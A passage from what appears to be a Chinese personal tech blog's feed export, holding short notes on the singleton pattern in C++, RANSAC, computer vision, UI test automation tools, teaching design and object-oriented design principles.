title="单例模式"></a>单例模式</h2><p>单例是指在程序运行周期内有且只有一个实例化的对象。</p>
<p>根据实例化的时机，主要分为饿汉和懒汉两种。</p>
<h3 id="饿汉"><a href="#饿汉" class="headerlink" title="饿汉"></a>饿汉</h3><p>第一次获取实例前就已经创建好。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Singleton &#123;</span><br><span class="line"> public:</span><br><span class="line">  static Singleton* GetInstance();</span><br><span class="line"> private:</span><br><span class="line">  static Singleton* instance_;</span><br><span class="line">&#125;;</span><br><span class="line">Singleton* instance_ &#x3D; new Singleton();  &#x2F;&#x2F; 已经创建好</span><br><span class="line"></span><br><span class="line">Singleton* Singleton::GetInstance() &#123;</span><br><span class="line">  return instance_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="懒汉"><a href="#懒汉" class="headerlink" title="懒汉"></a>懒汉</h3><p>第一次获取实例时才创建。懒汉方式下会存在线程安全问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Singleton &#123;</span><br><span class="line"> public:</span><br><span class="line">  static Singleton* GetInstance();</span><br><span class="line"> private:</span><br><span class="line">  static Singleton* instance_;</span><br><span class="line">&#125;;</span><br><span class="line">Singleton* instance_ &#x3D; nullptr;  &#x2F;&#x2F; 静态变量的初始化，默认为nullptr</span><br><span class="line"></span><br><span class="line">Singleton* Singleton::GetInstance() &#123;</span><br><span class="line">  if (instance_ &#x3D;&#x3D; nullptr) &#123;</span><br><span class="line">    instance_ &#x3D; new Singleton();  &#x2F;&#x2F; instance_为空时才创建</span><br><span class="line">  &#125;</span><br><span class="line">  return instance_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h1><h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><h2 id="装饰模式"><a href="#装饰模式" class="headerlink" title="装饰模式"></a>装饰模式</h2><h2 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h2><h2 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h2><h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><h1 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h1><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><h2 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h2><h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h2><h2 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h2><h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://design-patterns.readthedocs.io/zh_CN/latest/index.html" target="_blank" rel="noopener">图说设计模式</a>,by me115.</li>
<li><a href="http://www.3wwang.cn/html/article_104.html" target="_blank" rel="noopener">【置顶】探究osg中的程序设计模式【目录】</a>,by 3wwang.</li>
<li><a href="http://c.biancheng.net/view/1402.html" target="_blank" rel="noopener">解释器模式（详解版）</a>,by c.biancheng.</li>
<li><a href="https://zhuanlan.zhihu.com/p/431714886" target="_blank" rel="noopener">C++各类设计模式及实现详解</a>,by linux.</li>
<li><a href="https://refactoringguru.cn/design-patterns/catalog" target="_blank" rel="noopener">The Catalog of Design Patterns</a>,by refactoringguru.</li>
<li><a href="https://blog.csdn.net/sinat_31135199/article/details/71307940" target="_blank" rel="noopener">C++ 静态单例</a>,by sinat_31135199.</li>
<li><a href="https://blog.csdn.net/hahacaidao/article/details/119613029" target="_blank" rel="noopener">单例模式对象的删除</a>,by hahacaidao.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>软件行业的思考</title>
    <url>/2022/12/08/%E8%BD%AF%E4%BB%B6%E8%A1%8C%E4%B8%9A%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p><a href="https://user.guancha.cn/main/content?id=899229" target="_blank" rel="noopener">中国软件三十年：烟尘隐入，夹缝重生</a>这篇文章对中国软件行业的历史、发展规律和现状认识比较深刻，因此摘抄一下：</p>
<blockquote>
<p>中国软件的三大顽疾：一是企业数字化认识低，认为软件没用；二是定制化需求多且杂，「项目」导向而非「产品」导向；三是用户付费意愿和能力不足，软件公司难以积累利润投入研发。</p>
</blockquote>
<blockquote>
<p>大约是在2002年左右，雷军为了求证用户到底在意什么， 专门请了一家调查公司，在4个城市作了样本调查， 在4个城市作了用户专访， 最后结果让金山的工程师们很伤心：用户最在意的就是使用习惯，并不在意那些「创新」。</p>
</blockquote>
<blockquote>
<p>软件行业最终还是要靠「产品」说话。无论2C还是2B，软件好不好用，是用户选择最简单直接的一个标准。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://user.guancha.cn/main/content?id=899229" target="_blank" rel="noopener">中国软件三十年：烟尘隐入，夹缝重生</a>,by 饭统戴老板.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>遗传算法简介</title>
    <url>/2022/08/21/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<blockquote>
<p>能够生存下来的往往不是最强大的物种，也不是最聪明的物种，而是最能适应环境的物种。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://mp.weixin.qq.com/s/JWy_jWDHYyfA-oJS3u8OxQ" target="_blank" rel="noopener">一文读懂遗传算法工作原理（附Python实现）</a>,by 深度学习初学者.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>追求理解的教学设计读书笔记</title>
    <url>/2023/03/18/%E8%BF%BD%E6%B1%82%E7%90%86%E8%A7%A3%E7%9A%84%E6%95%99%E5%AD%A6%E8%AE%BE%E8%AE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>《追求理解的教学设计方法》一书采用逆向设计方法，认为教学设计应分为如下三个阶段：</p>
<h1 id="阶段1–预期成果"><a href="#阶段1–预期成果" class="headerlink" title="阶段1–预期成果"></a>阶段1–预期成果</h1><h2 id="所确定的目标"><a href="#所确定的目标" class="headerlink" title="所确定的目标"></a>所确定的目标</h2><p>教学设计目标，该设计将达到什么目标?</p>
<h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>学生将理解…</p>
<ul>
<li>大概念是什么?</li>
<li>期望他们获得的特定理解是什么?</li>
<li>可预见的误解是什么？</li>
</ul>
<h2 id="基本问题"><a href="#基本问题" class="headerlink" title="基本问题"></a>基本问题</h2><ul>
<li>什么样的启发性问题能够促进探究、理解和学习迁移?</li>
</ul>
<h2 id="学生将会知道…"><a href="#学生将会知道…" class="headerlink" title="学生将会知道…"></a>学生将会知道…</h2><ul>
<li>作为本单元的学习结果，学生将会获得哪些关键知识和技能？</li>
<li>习得这些知识和技能后，他们最终能够做什么？</li>
</ul>
<h2 id="学生将能够做到…"><a href="#学生将能够做到…" class="headerlink" title="学生将能够做到…"></a>学生将能够做到…</h2><h1 id="阶段2–评估证据"><a href="#阶段2–评估证据" class="headerlink" title="阶段2–评估证据"></a>阶段2–评估证据</h1><h2 id="表现性任务"><a href="#表现性任务" class="headerlink" title="表现性任务"></a>表现性任务</h2><ul>
<li>学生通过哪些真实的表现性任务证明自己达到了预期的理解目标？</li>
<li>通过什么标准评判理解成效？</li>
</ul>
<h2 id="其他证据"><a href="#其他证据" class="headerlink" title="其他证据"></a>其他证据</h2><ul>
<li>学生通过哪些其他证据（例如：小测验、考试、问答题、观察、作业、日志）证明自己达到了预期成果？</li>
<li>学生如何反馈和自评自己的学习？</li>
</ul>
<h1 id="阶段3–学习计划"><a href="#阶段3–学习计划" class="headerlink" title="阶段3–学习计划"></a>阶段3–学习计划</h1><p>设计关键的教学和学习活动。哪些学习体验和教学能够使学生达到预期的结果，以WHERETO分类学习活动。</p>
<ul>
<li>W=帮助学生知道此单元的方向和预期成果？帮助教师知道学生从哪开始先前知识和兴趣？</li>
<li>H=把我学生情况和保持学生兴趣？</li>
<li>E=武装学生，帮助他们体验主要观点和探索问题?</li>
<li>R=提供机会去反思和修改他们的理解及学习表现？</li>
<li>E=允许学生评价他们的学习表现及含义？</li>
<li>T=对于学生不同的需要、兴趣和能力做到量体裁衣个性化？</li>
<li>O=组织教学使其最大程度地提升学生地学习动机与持续参与地热情，提升学习效果？</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/27054388/" target="_blank" rel="noopener">追求理解的教学设计(第二版)</a>,by 格兰特·威金斯 杰伊·麦克泰格.</li>
<li><a href="https://cft.vanderbilt.edu/guides-sub-pages/understanding-by-design/" target="_blank" rel="noopener">Understanding by Design</a>,by Ryan S. Bowen.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>管理</tag>
        <tag>教学</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机视觉研究范畴简介</title>
    <url>/2018/12/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E7%A0%94%E7%A9%B6%E8%8C%83%E7%95%B4%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>计算机视觉是一个跨领域的交叉学科，包括计算机科学（图形、算法、理论、系统、体系结构），数学（信息检索、机器学习），工程学（机器人、语音、自然语言处理、图像处理），物理学（光学 ），生物学（神经科学）和心理学（认知科学）等等。那么什么是计算机视觉呢？这里给出了几个比较严谨的定义：</p>
<ol>
<li>“对图像中的客观对象构建明确而有意义的描述”（Ballard＆Brown，1982）</li>
<li>“从一个或多个数字图像中计算三维世界的特性”（Trucco＆Verri，1998）</li>
<li>“基于感知图像做出对客观对象和场景有用的决策”（Sockman＆Shapiro，2001）</li>
</ol>
<h1 id="研究范畴"><a href="#研究范畴" class="headerlink" title="研究范畴"></a>研究范畴</h1><p>视觉识别是计算机视觉的关键组成部分，如图像分类、定位和检测。神经网络和深度学习的最新进展极大地推动了这些最先进的视觉识别系统的发展。下面介绍 5 种主要的计算机视觉技术：</p>
<ul>
<li>图像分类</li>
</ul>
<p>给定一组各自被标记为单一类别的图像，我们对一组新的测试图像的类别进行预测，并测量预测的准确性结果，这就是图像分类问题。图像分类问题需要面临以下几个挑战：</p>
<p>视点变化，尺度变化，类内变化，图像变形，图像遮挡，照明条件和背景杂斑</p>
<ul>
<li>对象检测</li>
</ul>
<p>识别图像中的对象这一任务，通常会涉及到为各个对象输出边界框和标签。这不同于分类/定位任务——对很多对象进行分类和定位，而不仅仅是对个主体对象进行分类和定位。在对象检测中，你只有 2 个对象分类类别，即对象边界框和非对象边界框。例如，在汽车检测中，你必须使用边界框检测所给定图像中的所有汽车。</p>
<ul>
<li>目标跟踪</li>
</ul>
<p>目标跟踪，是指在特定场景跟踪某一个或多个特定感兴趣对象的过程。传统的应用就是视频和真实世界的交互，在检测到初始对象之后进行观察。现在，目标跟踪在无人驾驶领域也很重要，例如 Uber 和特斯拉等公司的无人驾驶。</p>
<ul>
<li>语义分割</li>
</ul>
<p>计算机视觉的核心是分割，它将整个图像分成一个个像素组，然后对其进行标记和分类。特别地，语义分割试图在语义上理解图像中每个像素的角色（比如，识别它是汽车、摩托车还是其他的类别）。</p>
<ul>
<li>实例分割</li>
</ul>
<p>除了语义分割之外，实例分割将不同类型的实例进行分类，比如用 5 种不同颜色来标记 5 辆汽车。分类任务通常来说就是识别出包含单个对象的图像是什么，但在分割实例时，我们需要执行更复杂的任务。我们会看到多个重叠物体和不同背景的复杂景象，我们不仅需要将这些不同的对象进行分类，而且还要确定对象的边界、差异和彼此之间的关系！</p>
<h1 id="典型应用"><a href="#典型应用" class="headerlink" title="典型应用"></a>典型应用</h1><p>计算机视觉领域已经衍生出了一大批快速成长的、有实际作用的应用，例如：</p>
<ul>
<li>人脸识别： Snapchat 和 Facebook 使用人脸检测算法来识别人脸。</li>
<li>图像检索：Google Images 使用基于内容的查询来搜索相关图片，算法分析查询图像中的内容并根据最佳匹配内容返回结果。</li>
<li>游戏和控制：使用立体视觉较为成功的游戏应用产品是：微软 Kinect。</li>
<li>监测：用于监测可疑行为的监视摄像头遍布于各大公共场所中。</li>
<li>生物识别技术：指纹、虹膜和人脸匹配仍然是生物识别领域的一些常用方法。</li>
<li>智能汽车：计算机视觉仍然是检测交通标志、灯光和其他视觉特征的主要信息来源。</li>
</ul>
<h1 id="前沿研究"><a href="#前沿研究" class="headerlink" title="前沿研究"></a>前沿研究</h1><ul>
<li>超分辨率重建 (Image Super-Resolution)</li>
<li>图像着色 (Image Colorization)</li>
<li>“看图说话” (Image Caption)</li>
<li>人像复原 (Sketch Inversion)</li>
<li>图像自动生成</li>
</ul>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://blog.csdn.net/dQCFKyQDXYm3F8rB0/article/details/80016353" target="_blank" rel="noopener">详解计算机视觉五大技术：图像分类、对象检测、目标跟踪、语义分割和实例分割…</a>, by AI科技大本营</li>
<li><a href="https://zhuanlan.zhihu.com/p/21341440" target="_blank" rel="noopener">「无中生有」计算机视觉探奇</a>, by 魏秀参</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>金句摘抄</title>
    <url>/2022/12/16/%E9%87%91%E5%8F%A5%E6%91%98%E6%8A%84/</url>
    <content><![CDATA[<blockquote>
<p>中国教材的最大问题，并不是知识点的讲解，而是缺乏得出结论的过程。</p>
</blockquote>
<p>– 《为什么医学教材不好用？》</p>
<blockquote>
<p>我不善于当众演讲，在人多的场合发言，我会紧张。但是后来，我发现听众真的不在乎，如果你讲得很糟糕，他们可能会发笑片刻，但很快就会忘记。</p>
</blockquote>
<blockquote>
<p>事实是我们放大了别人的想法。有人说的很对：我们在想象中比在现实中，遭受更多的痛苦。</p>
</blockquote>
<p>– Hacker News 读者</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cxyxiaowu.com/11531.html" target="_blank" rel="noopener">GitHub 上这个「计算机科学」自学指南火了！</a>,by 吴师兄.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>重要性采样与重参数理解</title>
    <url>/2021/06/16/%E9%87%8D%E8%A6%81%E6%80%A7%E9%87%87%E6%A0%B7%E4%B8%8E%E9%87%8D%E5%8F%82%E6%95%B0%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>重要性采样与重参数是深度强化学习算法中常用的统计学技巧，比较难理解，遂将一些解读记录如下。</p>
<h1 id="重要性采样"><a href="#重要性采样" class="headerlink" title="重要性采样"></a>重要性采样</h1><h1 id="重参数"><a href="#重参数" class="headerlink" title="重参数"></a>重参数</h1><p>利用行为策略产生的数据评估目标策略需要利用重要性采样方法。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://spaces.ac.cn/archives/6705" target="_blank" rel="noopener">漫谈重参数：从正态分布到Gumbel Softmax</a>,by 苏剑林.</li>
<li><a href="https://blog.csdn.net/hehedadaq/article/details/112232179" target="_blank" rel="noopener">重要性采样(Importance Sampling)详细学习笔记</a>,by hehedadaq.</li>
<li><a href="https://zhuanlan.zhihu.com/p/150693309" target="_blank" rel="noopener">PR Sampling Ⅰ: 蒙特卡洛采样、重要性采样及python实现</a>,by 刘浚嘉.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>随机抽样一致</title>
    <url>/2019/06/23/%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7%E4%B8%80%E8%87%B4/</url>
    <content><![CDATA[<p>随机抽样一致算法（RANdom SAmple Consensus，RANSAC）。它采用迭代的方式从一组包含离群(outlier)的被观测数据中估算出数学模型的参数。 RANSAC是一个非确定性算法，在某种意义上说，它会产生一个在一定概率下合理的结果，而更多次的迭代会使这一概率增加。此RANSAC算法在1981年由Fischler和Bolles首次提出。</p>
<p>RANSAC的基本假设是</p>
<ul>
<li>“内群”(inlier)数据可以通过几组模型的参数来叙述其分布，而“离群”(outlier)数据则是不适合模型化的数据。</li>
<li>数据会受噪声影响，噪声指的是离群，例如从极端的噪声或错误解释有关数据的测量或不正确的假设。</li>
<li>RANSAC假定，给定一组（通常很小）的内群，存在一个程序，这个程序可以估算最佳解释或最适用于这一数据模型的参数。</li>
</ul>
<h1 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h1><p>这里用一个简单的例子来说明，在一组数据点中找到一条最适合的线。假设，此有一组集合包含了内群以及离群，其中内群为可以被拟合到线段上的点，而离群则是无法被拟合的点。如果我们用简单的最小二乘法来找此线，我们将无法得到一条适合于内群的线，因为最小二乘法会受离群影响而影响其结果。而RANSAC，可以只由内群来计算出模型，而且概率还够高。然而，RANSAC无法保证结果一定最好，所以必须小心选择参数，使其能有足够的概率。</p>
<div style="display:flex">
    <div style="width: 45%;margin: 0 2.5%;">
        <img display="block" src="images/255px-Line_with_outliers.svg.png" width="100%" alt="包含许多离群的一组数据"/>
        <div>包含许多离群的一组数据，要找一条最适合的线。</div>
    </div>
    <div style="width: 45%;margin: 0 2.5%;">
        <img display="block" src="images/255px-Fitted_line.svg.png" width="100%" alt="RANSAC找到的线"/>
        <div>RANSAC找到的线，离群值对结果没影响（蓝色点为内群，红色点为离群）</div>
    </div>   
</div>

<h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><p>RANSAC算法是一个学习的技巧，通过使用观测数据的随机样本来估计模型参数。RANSAC使用投票机制来寻找优化的拟合结果。每个数据元被用来投票一或多个模型。投票机制基于两点假设：</p>
<ul>
<li><p>噪音大的特征并不能一直单独为某个模型投票</p>
</li>
<li><p>有足够多的特征来拟合一个好的模型</p>
</li>
</ul>
<p>一般RANSAC算法由两步骤迭代计算：</p>
<ul>
<li><p>一个样本子集，包含数据选取（随机选取）。通过使用这些数据得到一个拟合模型和相关的模型参数。样本子集的数量是最小充分的得到模型参数。</p>
</li>
<li><p>算法检查数据集中的哪些元素是一直在第一步估计到的模型当中的。如果在阈值（相对噪声的最大偏离度）外的话，该模型元素不能拟合估计到的模型便会被当做outlier。</p>
</li>
</ul>
<p>inliers的设置称作“一致性设置”RANSAC算法会一直迭代直到获得足够的inliers。</p>
<p>RANSAC的输入是一些观测数据和一些“可信度”参数，实现步骤：</p>
<ol>
<li>随机选择一些原始数据，叫作假设inliers子集</li>
<li>建立模型拟合</li>
<li>用其他数据来验证，根据模型特定的loss-function来计算是否符合该模型</li>
<li>如果足够的点都算是“一致性”设置里则该模型算是好模型</li>
<li>比较所有的“一致性”设置（就是建立的所有模型）看看哪个inliers多就是我们要的。</li>
</ol>
<h2 id="参数决定"><a href="#参数决定" class="headerlink" title="参数决定"></a>参数决定</h2><p>假设每个点是真正内群的几率是 $w$ :<br>$$ w = 真正內群的數目 / 數據總共的數量$$</p>
<p>通常我们不知道 $w$ 是多少, $w^n$ 是所选择的n个点都是内群的几率, $1-w^n$ 是所选择的n个点至少有一个不是内群的几率, $(1 − w^n)^k$ 是表示重复k次都没有全部的n个点都是内群的几率, 这边定算法跑k次以后成功的几率是p，那么,</p>
<p>$$ 1 − p =(1 − w^n)^k $$<br>$$ p = 1 −(1 − w^n)^k $$</p>
<p>所以如果希望成功几率高，p = 0.99, 当n不变时，k越大,p越大, 当w不变时，n越大，所需的k就越大, 通常w未知，所以n选小一点比较好。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>RANSAC常被用在计算机视觉，例如，对应点问题和 估算立体摄影机双眼相对点的基本矩阵。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/36301702" target="_blank" rel="noopener">随机抽样一致RANSAC: Random Sample Consensus</a>,by 江知季.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%9A%A8%E6%A9%9F%E6%8A%BD%E6%A8%A3%E4%B8%80%E8%87%B4" target="_blank" rel="noopener">随机抽样一致</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>计算机视觉</tag>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>软件自动化测试工具简介</title>
    <url>/2021/11/14/%E8%BD%AF%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>在软件测试中，自动化测试指的是使用独立于待测软件的其他软件来自动执行测试、比较实际结果与预期并生成测试报告这一过程。在测试流程已经确定后，测试自动化可以自动执行的一些重复但必要测试工作。也可以完成手动测试几乎不可能完成的测试。对于持续交付和持续集成的开发方式而言，测试自动化是至关重要的。</p>
<h1 id="GUI自动化测试工具"><a href="#GUI自动化测试工具" class="headerlink" title="GUI自动化测试工具"></a>GUI自动化测试工具</h1><h2 id="WinAppDriver"><a href="#WinAppDriver" class="headerlink" title="WinAppDriver"></a>WinAppDriver</h2><p>WinAppDriver(Windows Application Driver)是一个类似Selenium的UI自动化测试服务。<br>系统要求: Windows10或Windows Server 2016。支持应用程序: UWP, WPF, WinForms, Win32。</p>
<h2 id="Microsoft-UI-Automation"><a href="#Microsoft-UI-Automation" class="headerlink" title="Microsoft UI Automation"></a>Microsoft UI Automation</h2><p>UI Automation是Microsoft .NET 3.0框架下提供的一种用于自动化测试的技术，是在MSAA基础上建立的，MSAA就是Microsoft Active Accessibility。UI Automation在某些方面超过了MSAA，UI自动化提供了Windows Vista中，微软Windows XP的全部功能，和Windows Server 2003。</p>
<h1 id="Web自动化测试工具"><a href="#Web自动化测试工具" class="headerlink" title="Web自动化测试工具"></a>Web自动化测试工具</h1><h2 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h2><p>Selenium 是为web浏览器的自动化提供了各种工具和依赖包。它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器，如果你在这些浏览器里面安装一个 Selenium 的插件，那么便可以方便地实现 Web 界面的测试。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2021/11/12/spyxx%E7%AE%80%E4%BB%8B/">spy++简介</a>,by jackhuang.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95" target="_blank" rel="noopener">自动化测试</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/38085152" target="_blank" rel="noopener">用 Selenium + OpenCV 来玩 HTML5 小游戏</a>,by 郑恒.</li>
<li><a href="https://www.selenium.dev/" target="_blank" rel="noopener">Selenium</a>,by Selenium homepage.</li>
<li><a href="https://zhuanlan.zhihu.com/p/159726891" target="_blank" rel="noopener">【龙测教程】教你做windows自动化测试</a>,by pur-maple.</li>
<li><a href="https://www.cnblogs.com/kangyi/archive/2009/09/08/1549411.html" target="_blank" rel="noopener">使用UI Automation实现自动化测试–1</a>,by 开着拖拉机.</li>
<li><a href="https://blog.csdn.net/vagabond1/article/details/5648902" target="_blank" rel="noopener">Windows GUI自动化测试技术的比较和展望</a>,by vagabond1.</li>
<li><a href="https://www.cnblogs.com/Yinkaisheng/p/3444132.html" target="_blank" rel="noopener">开源自己用python封装的一个Windows GUI(UI Automation)自动化工具，支持MFC,Windows Forms,WPF,Metro,Qt</a>,by YinKaisheng.</li>
<li><a href="https://posts.careerengine.us/p/613dedf6687c921022c512fc?from=latest-posts-panel&type=title" target="_blank" rel="noopener">聊聊 PC 端自动化最佳方案：Pywinauto</a>,by Linux爱好者.</li>
<li><a href="https://juejin.cn/post/6995106973356130340" target="_blank" rel="noopener">聊聊 PC 端自动化最佳方案 - WinAppDriver</a>,by AirPythonl.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象编程的设计原则</title>
    <url>/2019/01/17/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<p>说来惭愧，我虽然计算机科学专业科班出生，但是对面向对象编程的理解并不透彻。但在看到“如何写一手漂亮的模型：面向对象编程的设计原则综述”后，感觉收获不少，欣喜之余赶紧摘抄记录一下。</p>
<h1 id="面向对象编程的设计原则"><a href="#面向对象编程的设计原则" class="headerlink" title="面向对象编程的设计原则"></a>面向对象编程的设计原则</h1><p>为了写出清晰的、高质量的、可维护并且可扩展的代码，面向对象编程（OOP）将是我们最佳的选择。</p>
<h2 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h2><p>因为我们要围绕对象来建立代码，所以区分它们的不同责任和变化是有用的。一般来说，面向对象的编程有三种类型的对象。</p>
<h3 id="实体对象"><a href="#实体对象" class="headerlink" title="实体对象"></a>实体对象</h3><p>这类对象通常对应着问题空间中的一些现实实体。比如我们要建立一个角色扮演游戏（RPG），那么简单的 Hero 类就是一个实体对象。</p>
<p>这类对象通常包含关于它们自身的属性（例如 health 或 mana），这些属性根据具体的规则都是可修改的。</p>
<h3 id="控制对象（Control-Object）"><a href="#控制对象（Control-Object）" class="headerlink" title="控制对象（Control Object）"></a>控制对象（Control Object）</h3><p>控制对象（有时候也称作管理对象）主要负责与其它对象的协调，这是一些管理并调用其它对象的对象。我们上面的 RPG 案例中有一个很棒的例子，Fight 类控制两个英雄，并让它们对战。</p>
<p>在这种类中，为对战封装编程逻辑可以给我们提供多个好处：其中之一就是动作的可扩展性。我们可以很容易地将参与战斗的英雄传递给非玩家角色（NPC），这样它们就能利用相同的 API。我们还可以很容易地继承这个类，并复写一些功能来满足新的需要。</p>
<h3 id="边界对象（Boundary-Object）"><a href="#边界对象（Boundary-Object）" class="headerlink" title="边界对象（Boundary Object）"></a>边界对象（Boundary Object）</h3><p>这些是处在系统边缘的对象。任何一个从其它系统获取输入或者给其它系统产生输出的对象都可以被归类为边界对象，无论那个系统是用户，互联网或者是数据库。</p>
<p>这些边界对象负责向系统内部或者外部传递信息。例如对要接收的用户指令，我们需要一个边界对象来将键盘输入（比如一个空格键）转换为一个可识别的域事件（例如角色的跳跃）。</p>
<h3 id="Bonus：值对象（Value-Object）"><a href="#Bonus：值对象（Value-Object）" class="headerlink" title="Bonus：值对象（Value Object）"></a>Bonus：值对象（Value Object）</h3><p>价值对象代表的是域（domain）中的一个简单值。它们无法改变，不恒一。</p>
<p>如果将它们结合在我们的游戏中，Money 类或者 Damage 类就表示这种对象。上述的对象让我们容易地区分、寻找和调试相关功能，然而仅使用基础的整形数组或者整数却无法实现这些功能。</p>
<p><strong>它们可以归类为实体对象的子类别</strong>。</p>
<h2 id="关键设计原则"><a href="#关键设计原则" class="headerlink" title="关键设计原则"></a>关键设计原则</h2><p>设计原则是软件设计中的规则，过去这些年里已经证明它们是有价值的。严格地遵循这些原则有助于软件达到一流的质量。</p>
<h3 id="抽象（Abstraction）"><a href="#抽象（Abstraction）" class="headerlink" title="抽象（Abstraction）"></a>抽象（Abstraction）</h3><p>抽象就是将一个概念在一定的语境中简化为原始本质的一种思想。它允许我们拆解一个概念来更好的理解它。</p>
<p>上面的游戏案例阐述了抽象，让我们来看一下 Fight 类是如何构建的。我们以尽可能简单的方式使用它，即在实例化的过程中给它两个英雄作为参数，然后调用 fight() 方法。不多也不少，就这些。</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装可以被认为是将某些东西放在一个类以内，并限制了它向外部展现的信息。在软件中，限制对内部对象和属性的访问有助于保证数据的完整性。</p>
<p>将内部编程逻辑封装成黑盒子，我们的类将更容易管理，因为我们知道哪部分可以被其它系统使用，哪些不行。这意味着我们在保留公共部分并且保证不破坏任何东西的同时能够重用内部逻辑。此外，我们从外部使用封装功能变得更加简单，因为需要考虑的事情也更少。</p>
<h3 id="分解"><a href="#分解" class="headerlink" title="分解"></a>分解</h3><p>分解就是把一个对象分割为多个更小的独立部分，这些独立的部分更易于理解、维护和编程。</p>
<p>试想我们现在希望 Hero 类能结合更多的 RPG 特征，例如 buffs，资产，装备，角色属性。</p>
<p>解决方案就是将 Hero 对象分解为多个更小的对象，每个小对象可承担一些功能。</p>
<p>下面是三种分解关系：</p>
<ul>
<li>关联：在两个组成部分之间定义一个松弛的关系。两个组成部分不互相依赖，但是可以一起工作。例如 Hero 对象和 Zone 对象。</li>
